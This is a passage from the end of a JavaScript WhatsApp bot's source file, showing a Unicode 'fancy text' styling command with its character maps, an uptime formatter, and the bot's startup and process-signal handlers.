      // 33 - ɀꪮᛕꪮꪊ Vai/Runic mix
      { map: {'a':'ꪖ','b':'ꪜ','c':'ꪊ','d':'ᦔ','e':'ꫀ','f':'ꪰ','g':'ᧁ','h':'ꫝ','i':'ꪱ','j':'ꪝ','k':'ᛕ','l':'ꪶ','m':'ꪑ','n':'ꪀ','o':'ꪮ','p':'ρ','q':'ꪕ','r':'ꪹ','s':'ꫛ','t':'ꪻ','u':'ꪊ','v':'ꪜ','w':'ꪲ','x':'ꪤ','y':'ꪗ','z':'ɀ','A':'ꪖ','B':'ꪜ','C':'ꪊ','D':'ᦔ','E':'ꫀ','F':'ꪰ','G':'ᧁ','H':'ꫝ','I':'ꪱ','J':'ꪝ','K':'ᛕ','L':'ꪶ','M':'ꪑ','N':'ꪀ','O':'ꪮ','P':'ρ','Q':'ꪕ','R':'ꪹ','S':'ꫛ','T':'ꪻ','U':'ꪊ','V':'ꪜ','W':'ꪲ','X':'ꪤ','Y':'ꪗ','Z':'ɀ'} },
      // 34 - plain lowercase
      { map: {'a':'a','b':'b','c':'c','d':'d','e':'e','f':'f','g':'g','h':'h','i':'i','j':'j','k':'k','l':'l','m':'m','n':'n','o':'o','p':'p','q':'q','r':'r','s':'s','t':'t','u':'u','v':'v','w':'w','x':'x','y':'y','z':'z','A':'a','B':'b','C':'c','D':'d','E':'e','F':'f','G':'g','H':'h','I':'i','J':'j','K':'k','L':'l','M':'m','N':'n','O':'o','P':'p','Q':'q','R':'r','S':'s','T':'t','U':'u','V':'v','W':'w','X':'x','Y':'y','Z':'z'} },
      // 35 - Bold Italic Script 𝒁𝒐𝒌𝒐𝒖
      { range: [0x1D400, 0x1D419, 0x1D400], italic: true },
      // 36 - Circled letters Ⓩⓞⓚⓞⓤ
      { map: {'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ','k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ','u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ','A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ','K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ','U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'} },
      // 37 - Upside down Zoʞon-ɯp
      { map: {'a':'ɐ','b':'q','c':'ɔ','d':'p','e':'ǝ','f':'ɟ','g':'ƃ','h':'ɥ','i':'ı','j':'ɾ','k':'ʞ','l':'l','m':'ɯ','n':'u','o':'o','p':'d','q':'b','r':'ɹ','s':'s','t':'ʇ','u':'n','v':'ʌ','w':'ʍ','x':'x','y':'ʎ','z':'z','A':'∀','B':'q','C':'Ɔ','D':'p','E':'Ǝ','F':'Ⅎ','G':'פ','H':'H','I':'I','J':'ɾ','K':'ʞ','L':'˥','M':'W','N':'N','O':'O','P':'d','Q':'Q','R':'ɹ','S':'S','T':'┴','U':'∩','V':'Λ','W':'M','X':'X','Y':'⅄','Z':'Z'} },
      // 38 = same as 29 (small caps)
      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 39 = same as 27
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 40 = same as 15
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 41 = same as 5
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 42 - Negative circled 🅩🅞🅚🅞🅤
      { map: {'a':'🅐','b':'🅑','c':'🅒','d':'🅓','e':'🅔','f':'🅕','g':'🅖','h':'🅗','i':'🅘','j':'🅙','k':'🅚','l':'🅛','m':'🅜','n':'🅝','o':'🅞','p':'🅟','q':'🅠','r':'🅡','s':'🅢','t':'🅣','u':'🅤','v':'🅥','w':'🅦','x':'🅧','y':'🅨','z':'🅩','A':'🅐','B':'🅑','C':'🅒','D':'🅓','E':'🅔','F':'🅕','G':'🅖','H':'🅗','I':'🅘','J':'🅙','K':'🅚','L':'🅛','M':'🅜','N':'🅝','O':'🅞','P':'🅟','Q':'🅠','R':'🅡','S':'🅢','T':'🅣','U':'🅤','V':'🅥','W':'🅦','X':'🅧','Y':'🅨','Z':'🅩'} },
      // 43 - Underline Z̲o̲k̲o̲u̲
      { underline: true },
    ];

    const style = styles[styleIndex];
    if (!style) return text;

    // Style with underline
    if (style.underline) {
      return text.split('').map(c => c !== ' ' ? c + '\u0332' : c).join('');
    }

    // Style with range Unicode (mathématique)
    if (style.range) {
      const [upperBase, , lowerBase] = style.range;
      return text.split('').map(c => {
        const code = c.charCodeAt(0);
        if (code >= 65 && code <= 90) return String.fromCodePoint(upperBase + (code - 65));
        if (code >= 97 && code <= 122) return String.fromCodePoint(lowerBase + (code - 97));
        return c;
      }).join('');
    }

    // Style with map
    if (style.map) {
      return text.split('').map(c => style.map[c] || c).join('');
    }

    return text;
  }

  const TOTAL_STYLES = 43;

  // Un seul style demandé
  if (styleNum !== null && styleNum >= 1 && styleNum <= TOTAL_STYLES) {
    const result = applyStyle(text, styleNum - 1);
    await sock.sendMessage(remoteJid, {
      text: `✨ *Style ${styleNum}:*\n\n${result}`
    });
    return;
  }

  // Tous les styles — envoyer en un seul message
  const lines = [];
  for (let i = 1; i <= TOTAL_STYLES; i++) {
    try {
      const result = applyStyle(text, i - 1);
      lines.push(`*${i}.* ${result}`);
    } catch(e) {
      lines.push(`*${i}.* ${text}`);
    }
  }

  const output = `✨ *FANCY — ${text}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${lines.join('\n')}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n_${config.prefix}fancy [1-${TOTAL_STYLES}] [texte] pour un style spécifique_`;

  await sock.sendMessage(remoteJid, { text: output });
}

function formatUptime(seconds) {
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = Math.floor(seconds % 60);
  return `${hours}h ${minutes}m ${secs}s`;
}

// =============================================
// LANCEMENT DU BOT
// =============================================

console.log('╔══════════════════════════════╗');
console.log('║      SEIGNEUR TD 🇷🇴 v3.5      ║');
console.log('╚══════════════════════════════╝\n');

connectToWhatsApp().catch(err => {
  console.error('Failed to start bot:', err);
  saveData();
  process.exit(1);
});

process.on('SIGINT', () => {
  console.log('\n\n👋 Bot shutting down...');
  saveData();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n\n🛑 SIGTERM reçu — arrêt propre...');
  saveData();
  process.exit(0);
});

process.on('uncaughtException', (err) => {
  const msg = err?.message || String(err);
  if (msg.includes('Connection Closed') || msg.includes('Connection Terminated') ||
      msg.includes('Stream Errored') || msg.includes('connection closing')) {
    console.log('[WARN] Exception connexion (normal):', msg.split('\n')[0]);
    return;
  }
  console.error('Uncaught Exception:', err);
  saveData();
});

process.on('unhandledRejection', (err) => {
  const msg = err?.message || String(err);
  // Ignorer les erreurs de connexion fermée (normales lors des reconnexions)
  if (msg.includes('Connection Closed') || msg.includes('Connection Terminated') ||
      msg.includes('Stream Errored') || msg.includes('connection closing')) {
    console.log('[WARN] Connexion interrompue (normal):', msg.split('\n')[0]);
    return;
  }
  console.error('Unhandled Rejection:', err);
});
